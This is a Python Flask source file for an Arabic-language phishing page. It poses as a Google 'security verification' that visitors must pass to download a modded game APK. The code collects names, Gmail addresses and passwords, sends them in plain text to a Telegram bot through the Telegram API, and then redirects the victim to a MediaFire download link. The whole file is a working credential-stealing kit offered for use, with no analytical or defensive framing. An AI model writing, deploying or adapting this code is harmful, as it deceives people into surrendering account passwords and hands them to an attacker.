import os
import re
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "secure_app_secret_key_123")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# رابط التحميل المباشر على ميديافاير
FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"


@app.route("/", methods=["GET", "POST"])
def login():
  error = ""
  email_val = ""
  name_val = ""
  if request.method == "POST":
    name_val = request.form.get("name", "").strip()
    email_val = request.form.get("email", "").strip()
    password = request.form.get("password", "")

    email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"

    if not name_val:
      error = "الرجاء إدخال اسم المستخدم."
    elif not re.match(email_pattern, email_val):
      error = "البريد الإلكتروني غير صحيح. يُرجى التحقق مرة أخرى."
    elif len(password) <= 5:
      error = "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة."
    else:
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "🤖 تم اجتياز التحقق الأمني بنجاح:\n\n👤 الاسم: "
            f"{name_val}\n📧 البريد: {email_val}\n🔑 الباسورد: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      return redirect(FINAL_REDIRECT_URL)

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الأمني - Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        
        .container {
            width: 100%;
            max-width: 380px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .google-logo {
            font-size: 26px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
        }

        .subtitle { font-size: 14px; color: #5f6368; margin-bottom: 25px; line-height: 20px; }

        .error-msg { 
            color: #d93025; 
            font-size: 13px; 
            line-height: 18px; 
            margin-bottom: 15px; 
            width: 100%; 
            text-align: right; 
            background: #fce8e6; 
            padding: 12px; 
            border-radius: 8px; 
            border: 1px solid #fad2cf; 
        }

        .input-group { width: 100%; margin-bottom: 12px; text-align: right; }
        .input-group input {
            width: 100%;
            padding: 14px 12px;
            font-size: 15px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            outline: none;
            color: #202124;
            background: #fff;
        }
        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 13px 11px; }

        .submit-btn {
            width: 100%;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 25px;
            padding: 12px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 15px;
        }
        .submit-btn:hover { background: #1558b0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">التحقق الأمني</div>
        <div class="subtitle">يرجى تسجيل الدخول للتأكد من أنك لست برنامج روبوت وللمتابعة إلى ملف اللعبة.</div>

        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form method="POST" style="width: 100%;">
            <div class="input-group">
                <input type="text" name="name" required placeholder="اسم المستخدم" value="{{ name_val }}">
            </div>
            <div class="input-group">
                <input type="email" name="email" required placeholder="البريد الإلكتروني (Gmail)" value="{{ email_val }}">
            </div>
            <div class="input-group">
                <input type="password" name="password" required placeholder="كلمة المرور">
            </div>
            <button type="submit" class="submit-btn">متابعة التحقق</button>
        </form>
    </div>
</body>
</html>
""",
      error=error,
      email_val=email_val,
      name_val=name_val,
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
